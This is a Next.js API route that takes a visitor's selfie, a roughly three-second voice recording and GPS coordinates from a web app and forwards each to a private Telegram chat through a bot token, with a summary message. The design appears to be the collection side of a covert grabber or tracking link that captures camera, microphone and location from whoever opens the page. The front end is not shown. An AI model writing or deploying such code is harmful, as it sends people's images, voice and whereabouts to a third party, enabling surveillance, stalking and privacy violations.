import { NextRequest, NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function POST(req: NextRequest) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is not set in environment variables.");
    return NextResponse.json(
      { error: "Telegram bot token or chat ID is not configured." },
      { status: 500 }
    );
  }

  try {
    const { selfie, audio, latitude, longitude } = await req.json();

    const messages: Promise<Response>[] = [];

    // Send Selfie
    if (selfie) {
      console.log("Attempting to send selfie...");
      const base64Data = selfie.replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), "selfie.jpg");

      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData,
          // DO NOT set Content-Type header for FormData, fetch will set it automatically
        }).then(res => {
          console.log("Selfie API response status:", res.status);
          return res;
        })
      );
    }

    // Send Audio
    if (audio) {
      console.log("Attempting to send audio...");
      const base64Data = audio.replace(/^data:audio\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("audio", new Blob([buffer], { type: "audio/webm" }), "voice_message.webm");
      formData.append("duration", "3"); // Indicate 3 seconds duration

      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
          method: "POST",
          body: formData,
          // DO NOT set Content-Type header for FormData, fetch will set it automatically
        }).then(res => {
          console.log("Audio API response status:", res.status);
          return res;
        })
      );
    }

    // Send Location
    if (latitude && longitude) {
      console.log("Attempting to send location...");
      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            latitude: latitude,
            longitude: longitude,
          }),
        }).then(res => {
          console.log("Location API response status:", res.status);
          return res;
        })
      );
    }

    // Send a text message summary
    let summaryText = "Received data from web app:";
    if (selfie) summaryText += "\n- Selfie captured.";
    if (audio) summaryText += "\n- Voice message recorded.";
    if (latitude && longitude) summaryText += `\n- Location: Lat ${latitude}, Lng ${longitude}.`;
    if (!selfie && !audio && !latitude && !longitude) summaryText = "No data received from web app (permissions denied or unavailable).";

    messages.push(
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: summaryText,
        }),
      }).then(res => {
        console.log("Summary message API response status:", res.status);
        return res;
      })
    );

    await Promise.allSettled(messages); // Use allSettled to ensure all promises run even if one fails

    return NextResponse.json({ message: "Data processed and sent to Telegram." });
  } catch (error: any) {
    console.error("Error processing Telegram request:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}